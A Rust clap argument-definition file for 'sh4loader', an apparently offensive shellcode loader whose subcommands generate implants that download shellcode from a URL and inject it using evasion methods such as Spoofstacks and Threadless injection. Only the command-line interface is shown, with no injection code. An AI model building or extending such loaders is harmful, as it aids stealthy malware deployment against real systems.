use clap::{Parser, Subcommand};

#[derive(Parser, Debug)]
#[clap(
    name = "sh4loader",
    version = "1.0",
    author = "sh4n4c1",
    about = "shellcode loader"
)]
pub struct Args {
    #[command(subcommand)]
    pub cmd: Commands,
}
#[derive(Subcommand, Debug)]
pub enum Commands {
    /// Generate a common local injection
    Common {
        #[clap(
            short = 'u',
            long,
            value_name = "url",
            required = true,
            help = "implant download shellcode url"
        )]
        shellcode_url: String,
        #[clap(
            short = 'o',
            short,
            long,
            value_name = "output_path",
            help = "implant project output path"
        )]
        output_path: String,
        // change shellcode_path short name
        #[clap(
            short = 'p',
            long,
            value_name = "shellcode_path",
            help = "the shellcode path"
        )]
        shellcode_path: String,

        #[clap(
            short = 'd',
            long,
            value_name = "debug",
            help = "Implant debug mode",
            required = false
        )]
        debug: bool,
    },
    /// Generate a Caro-Kann + Spoofstacks local injection
    KannSpoofstacks {
        #[clap(
            short = 'u',
            long,
            value_name = "url",
            required = true,
            help = "implant download shellcode url"
        )]
        shellcode_url: String,
        #[clap(
            short = 'o',
            short,
            long,
            value_name = "output_path",
            help = "implant project output path"
        )]
        output_path: String,
        // change shellcode_path short name
        #[clap(
            short = 'p',
            long,
            value_name = "shellcode_path",
            help = "the shellcode path"
        )]
        shellcode_path: String,

        #[clap(
            short = 'd',
            long,
            value_name = "debug",
            help = "Implant debug mode",
            required = false
        )]
        debug: bool,
    },
    /// Generate a Spoofstacks local injection
    Spoofstacks {
        #[clap(
            short = 'u',
            long,
            value_name = "url",
            required = true,
            help = "implant download shellcode url"
        )]
        shellcode_url: String,
        #[clap(
            short = 'o',
            short,
            long,
            value_name = "output_path",
            help = "implant project output path"
        )]
        output_path: String,
        // change shellcode_path short name
        #[clap(
            short = 'p',
            long,
            value_name = "shellcode_path",
            help = "the shellcode path"
        )]
        shellcode_path: String,

        #[clap(
            short = 'd',
            long,
            value_name = "debug",
            help = "Implant debug mode",
            required = false
        )]
        debug: bool,
    },
    /// Generate a Caro-Kann + Threadless injection
    KannThreadless {
        #[clap(
            short = 'u',
            long,
            value_name = "url",
            required = true,
            help = "implant download shellcode url"
        )]
        shellcode_url: String,
        #[clap(
            short = 'o',
            short,
            long,
            value_name = "output_path",
            help = "implant project output path"
        )]
        output_path: String,
        // change shellcode_path short name
        #[clap(
            short = 'p',
            long,
            value_name = "shellcode_path",
            help = "the shellcode path"
        )]
        shellcode_path: String,

        #[clap(
            short = 'd',
            long,
            value_name = "debug",
            help = "Implant debug mode",
            required = false
        )]
        debug: bool,
    },
    /// Generate a Caro-Kann + Threadless + Spoofstacks  injection
    KannThreadlessStack {
        #[clap(
            short = 'u',
            long,
            value_name = "url",
            required = true,
            help = "implant download shellcode url"
        )]
        shellcode_url: String,
        #[clap(
            short = 'o',
            short,
            long,
            value_name = "output_path",
            help = "implant project output path"
        )]
        output_path: String,
        // change shellcode_path short name
        #[clap(
            short = 'p',
            long,
            value_name = "shellcode_path",
            help = "the shellcode path"
        )]
        shellcode_path: String,

        // debug options
        #[clap(
            short = 'd',
            long,
            value_name = "debug",
            help = "Implant debug mode",
            required = false
        )]
        debug: bool,
    },
}
